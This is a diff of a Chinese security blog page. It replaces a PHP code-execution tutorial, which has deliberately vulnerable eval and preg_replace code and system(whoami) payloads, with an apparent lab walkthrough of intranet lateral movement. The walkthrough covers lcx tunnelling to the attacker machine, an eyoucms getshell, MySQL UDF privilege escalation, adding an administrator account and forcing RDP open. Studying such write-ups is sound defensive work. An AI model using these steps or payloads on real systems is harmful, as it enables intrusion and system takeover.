@@ -5,14 +5,20 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="PHP代码审计基础：代码执行漏洞, Erikten 计算机 网络安全 黑客 网络攻防 渗透测试 安全开发 代码审计 PHP Python 漏洞挖掘 0day">
+    <meta name="keywords" content="内网渗透之Win7提权, Erikten 计算机 网络安全 黑客 网络攻防 渗透测试 安全开发 代码审计 PHP Python 漏洞挖掘 0day">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
     <meta name="google-site-verification" content="pBWoGvVEP36FzzS4xIpoMejc5UKi3RKcxd9rWWcjiDg">
     <meta name="360-site-verification" content="2db45fc772bbd3e7efd0985eec0fff97">
-    <meta name="description" content="代码执行漏洞
-PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去执行。该漏洞主要存在于eval()、assert()、preg_replace()、call_user_func()、array_map()以及动态函数中。
-">
+    <meta name="description" content="用到的工具及环境
+强开3389（内网强开3389神器）
+法克抓包工具（内网抓包改包）
+Scanport（小型端口扫描器）
+Mysql
+Windows Server 2003（内网跳板）
+Windows 7（目标靶机）
+
+上传Scanport">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +27,7 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="baidu-site-verification" content="wvlc3L96QK">
-    <title>PHP代码审计基础：代码执行漏洞 | Erikten</title>
+    <title>内网渗透之Win7提权 | Erikten</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -730,13 +736,13 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/01.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/12.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        PHP代码审计基础：代码执行漏洞
+                        内网渗透之Win7提权
                     </div>
                 </div>
             </div>
@@ -856,20 +862,20 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/PHP/" target="_blank">
-                                <span class="chip bg-color">PHP</span>
-                            </a>
-                        
-                            <a href="/tags/代码审计/" target="_blank">
-                                <span class="chip bg-color">代码审计</span>
-                            </a>
-                        
                             <a href="/tags/渗透测试/" target="_blank">
                                 <span class="chip bg-color">渗透测试</span>
                             </a>
                         
-                            <a href="/tags/代码执行/" target="_blank">
-                                <span class="chip bg-color">代码执行</span>
+                            <a href="/tags/提权/" target="_blank">
+                                <span class="chip bg-color">提权</span>
+                            </a>
+                        
+                            <a href="/tags/域渗透/" target="_blank">
+                                <span class="chip bg-color">域渗透</span>
+                            </a>
+                        
+                            <a href="/tags/内网渗透/" target="_blank">
+                                <span class="chip bg-color">内网渗透</span>
                             </a>
                         
                     </div>
@@ -880,8 +886,8 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/代码审计篇/" class="post-category" target="_blank">
-                                代码审计篇
+                            <a href="/categories/渗透测试篇/" class="post-category" target="_blank">
+                                渗透测试篇
                             </a>
                         
                     </div>
@@ -892,7 +898,7 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-11
+                    2021-03-03
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -906,14 +912,14 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        682
+                        961
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        3 分
                     </div>
                     
                 
@@ -930,82 +936,60 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><blockquote>
-<p>PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去执行。该漏洞主要存在于eval()、assert()、preg_replace()、call_user_func()、array_map()以及动态函数中。</p>
-</blockquote>
-<h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><ul>
-<li>用户能够控制函数的输入</li>
-<li>存在可执行代码的危险函数</li>
+                <h3 id="用到的工具及环境"><a href="#用到的工具及环境" class="headerlink" title="用到的工具及环境"></a>用到的工具及环境</h3><ul>
+<li>强开3389（内网强开3389神器）</li>
+<li>法克抓包工具（内网抓包改包）</li>
+<li>Scanport（小型端口扫描器）</li>
+<li>Mysql</li>
+<li>Windows Server 2003（内网跳板）</li>
+<li>Windows 7（目标靶机）</li>
 </ul>
-<h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><h4 id="eval-和assert"><a href="#eval-和assert" class="headerlink" title="eval()和assert()"></a>eval()和assert()</h4><p>eval()、assert()将输入的字符串参数当作PHP代码来执行.</p>
-<p>举个例子：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token shell-comment comment">#assert(</span><span class="token string">"$cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token keyword">else</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">echo</span> <span class="token string">'当前没有可执行的代码！'</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>php也是可以执行系统命令的，通过<strong>system()</strong>函数实现：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126103148947.png#pic_center" alt="在这里插入图片描述"></p>
-<h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><p><strong>call_user_func</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126144903837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>具体可以这么实现：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-
-<span class="token keyword">function</span> <span class="token function">callBack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token shell-comment comment"># 回调函数</span>
-<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">'callBack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>payload：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126151107167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h3><ol>
-<li>定义一个函数</li>
-<li>将函数名（字符串）赋值给一个变量</li>
-<li>使用变量名代替函数名动态调用函数</li>
-</ol>
-<p>测试代码：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token shell-comment comment"># a作为函数，b作为函数的参数</span>
-<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>payload：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>a<span class="token operator">=</span>assert<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126153256493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="preg-replace-代码执行"><a href="#preg-replace-代码执行" class="headerlink" title="preg_replace()代码执行"></a>preg_replace()代码执行</h3><p>preg_replace()函数就是通过正则替换，但是当正则中包含变量的情况下，会造成一个代码执行。</p>
-<h4 id="第一个参数"><a href="#第一个参数" class="headerlink" title="第一个参数"></a>第一个参数</h4><p>先来举一个例子，preg_replace中/e模式会将过滤后的字符串当作php代码执行，假如它将我们输入的内容拼接到了正则表达式中，那么我们可以构造一个含有代码执行漏洞的正则表达式：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">echo</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$Str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;php&gt;(.*?).$cmd"</span><span class="token punctuation">,</span><span class="token string">"\\1"</span><span class="token punctuation">,</span><span class="token string">"$Str"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>根据正则构造payload：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token number">1</span><span class="token operator">/</span>e<span class="token operator">&amp;</span>str<span class="token operator">=</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>php</span><span class="token punctuation">&gt;</span></span></span><span class="token function">system</span><span class="token punctuation">(</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126173243230.png#pic_center" alt="在这里插入图片描述"></p>
-<h4 id="第二个参数"><a href="#第二个参数" class="headerlink" title="第二个参数"></a>第二个参数</h4><p>第二个参数是，替换的字符串，当正则匹配上之后，程序将匹配的内容替换为第二个参数中的内容，如果第二个参数用户可控，那么也有可能造成代码执行：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/.ak.*php/e"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>构造payload：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>str<span class="token operator">=</span>1akphp<span class="token operator">&amp;</span>cmd<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span>whoami<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126173935827.png#pic_center" alt="在这里插入图片描述"></p>
-<h4 id="第三个参数"><a href="#第三个参数" class="headerlink" title="第三个参数"></a>第三个参数</h4><p>假如我们对输入可控，程序又没有做严格的替换，也会代码执行：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\[php\](.*?)ak/e"</span><span class="token punctuation">,</span><span class="token string">"\\1"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020112617445267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul>
-<li>尽量不要执行外部应用程序或命令</li>
-<li>使用自定义函数或函数库来代替外部应用程序或命令的功能</li>
-<li>使用escapeshellarg()函数过滤</li>
-<li>使用safe_mode_exec_dir来指定可执行文件路径</li>
-<li>将执行函数的参数做白名单限制，在代码或配置中限制某些参数</li>
+<h3 id="上传Scanport"><a href="#上传Scanport" class="headerlink" title="上传Scanport"></a>上传Scanport</h3><p>利用菜刀，将Scanport上传到03服务器上：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614766614961.png" alt="enter description here"></p>
+<p>这里我们还是利用之前的lcx进行一个内网穿透，然后本机访问1234进行远程登陆：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614767533958.png" alt="enter description here"></p>
+<p>在跳板上运行Scanport，之前传的竟然不支持64位，问题不大，我们传一个64位的上去运行一下即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614767885308.png" alt="enter description here"></p>
+<p>扫描发现内网192.168.192.130开放80端口，接下来的工作就是渗透这个192.168.192.130:80服务器了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614768028727.png" alt="enter description here"></p>
+<h3 id="内网Web渗透"><a href="#内网Web渗透" class="headerlink" title="内网Web渗透"></a>内网Web渗透</h3><p>内网中的Win 7虽然开放了80端口，但仅仅是内网访问，并没有映射到公网上，所以我们得先用03上的lcx将Win 7的80端口映射到我们的攻击机上</p>
+<pre class="line-numbers language-cmd"><code class="language-cmd">Windows 10：
+lcx.exe -listen 8888 88
+Windows 2003：
+lcx.exe -slave 192.168.1.103 8888 192.168.192.130 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这一波操作完，我们访问127.0.0.1:88就能够成功杀入内网对这台基于Win7搭建的Web服务器进行渗透了~渗透最关键的当然是信息收集，这里发现是用eyoucms搭建的，那我们就先去网上搜一下，看看有没有现成的exp可以用：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614781070147.png" alt=""></p>
+<p>网上一搜还是很多的，我们就用这个经典的eyoucms 1.0前台Getshell漏洞吧，具体的漏洞成因本文不做过多介绍，<a href="https://blog.csdn.net/weixin_44897902/article/details/103435905" target="_blank" rel="noopener">详情参考这里</a>。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614770599039.png" alt="enter description here"></p>
+<p>这里先测试下是否存在漏洞：</p>
+<pre><code>访问 http://127.0.0.1:88/index.php/api/Uploadify/preview</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614781249715.png" alt="enter description here"></p>
+<p>很好，漏洞存在，接下来我们用法克抓包进行POST数据，配置好参数直接发包，shell的地址会在返回包中：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614783065207.png" alt="enter description here"></p>
+<p>我们直接菜刀连接，成功拿下，接下来就是用经典的Mysql UDF提权：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614783474758.png" alt="enter description here"></p>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>先来看一下用Mysql UDF提权的条件：</p>
+<ul>
+<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
+<li>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</li>
+<li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li>
+<li>拥有可以将udf.dll写入相应目录的权限。</li>
 </ul>
+<p>查看一下3306端口是否存在：</p>
+<pre class="line-numbers language-cmd"><code class="language-cmd">netstat -ant | find "3306"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614784147446.png" alt="enter description here"></p>
+<p>我们接着回到菜刀，去找一下网站数据库的配置文件，看下数据库的密码是什么：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614784599554.png" alt="enter description here"></p>
+<pre><code>账号：root
+密码：root</code></pre><p>一切准备就绪后，传一个写好的UDF提权工具，Web访问一下，因为我这里已经传了一个免杀的udf.dll，所以会提示“导出DLL文件出错：File ‘C:MySQLlibpluginudf.dll’ already exists”<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614787969352.png" alt="enter description here"></p>
+<p>接着我们给肉鸡传一个Mysql.exe，用肉鸡去远程登陆Mysql执行命令：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614788220368.png" alt="enter description here"></p>
+<p>回到3389，登陆Win 7的Mysql：</p>
+<pre class="line-numbers language-cmd"><code class="language-cmd">mysql.exe -uadmin -h 192.168.192.130 -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614788529276.png" alt="enter description here"></p>
+<p>成功登录以后，创建cmdshell函数：</p>
+<pre class="line-numbers language-php"><code class="language-php">Create <span class="token keyword">Function</span> cmdshell returns string soname <span class="token string">'udf.dll'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>执行系统命令：</p>
+<pre class="line-numbers language-php"><code class="language-php">select <span class="token function">cmdshell</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614788643158.png" alt="enter description here"></p>
+<p>可以看到这里是最高权限了，接着创建用户：</p>
+<pre class="line-numbers language-php"><code class="language-php">select <span class="token function">cmdshell</span><span class="token punctuation">(</span><span class="token string">'net user hack Passwd123+ /add &amp;&amp; net localgroup administrators hack /add'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614788757584.png" alt="enter description here"></p>
+<p>但是Win 7并没有开放3389，我们只能传一个强开3389，然后在菜刀中运行一下：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614789591648.png" alt="enter description here"></p>
+<p>很好，接下来用肉鸡做一个端口转发，尝试远程登陆这台Win 7：</p>
+<pre><code>Windows 10：
+lcx.exe -listen 4444 3388
+Windows 2003：
+lcx.exe -slave 192.168.1.103 4444 192.168.192.130 3389</code></pre><p>最后，本地连接3388端口，输入账号密码静待30秒，抓鸡完毕：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614790053331.png" alt="enter description here"></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1174,7 +1158,7 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
                     </span>
                     <a href="https://Erikten.github.io" class="b-link-green">Erikten</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/posts/750291cd.html" class="b-link-green">PHP代码审计基础：代码执行漏洞</a>
+                    <a href="/posts/37b2a9ba.html" class="b-link-green">内网渗透之Win7提权</a>
                 </p>
             </div>
 
@@ -1526,58 +1510,60 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/8f83a13c.html">
+                <a href="/posts/37b2a9ba.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/11.jpg" class="responsive-img" alt="PHP代码审计基础：反序列化漏洞">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/12.jpg" class="responsive-img" alt="内网渗透之Win7提权">
                         
-                        <span class="card-title">PHP代码审计基础：反序列化漏洞</span>
+                        <span class="card-title">内网渗透之Win7提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            代码审计的基础，赶紧来GET吧~
+                            通过之前拿到的03服务器在内网进行横向移动，再抓一只鸡！
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-03-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/代码审计篇/" class="post-category" target="_blank">
-                                    代码审计篇
+                            <a href="/categories/渗透测试篇/" class="post-category" target="_blank">
+                                    渗透测试篇
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/PHP/" target="_blank">
-                        <span class="chip bg-color">PHP</span>
-                    </a>
-                    
-                    <a href="/tags/代码审计/" target="_blank">
-                        <span class="chip bg-color">代码审计</span>
-                    </a>
                     
                     <a href="/tags/渗透测试/" target="_blank">
                         <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/反序列化/" target="_blank">
-                        <span class="chip bg-color">反序列化</span>
+                    <a href="/tags/提权/" target="_blank">
+                        <span class="chip bg-color">提权</span>
+                    </a>
+                    
+                    <a href="/tags/域渗透/" target="_blank">
+                        <span class="chip bg-color">域渗透</span>
+                    </a>
+                    
+                    <a href="/tags/内网渗透/" target="_blank">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                 </div>
@@ -1591,31 +1577,31 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/908580e2.html">
+                <a href="/posts/d03e3fa0.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/09.jpg" class="responsive-img" alt="PHP代码审计基础：变量覆盖漏洞">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/02.jpg" class="responsive-img" alt="内网渗透之Win2003提权">
                         
-                        <span class="card-title">PHP代码审计基础：变量覆盖漏洞</span>
+                        <span class="card-title">内网渗透之Win2003提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            代码审计的基础，赶紧来GET吧~
+                            一篇文章教会你内网服务器提权
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
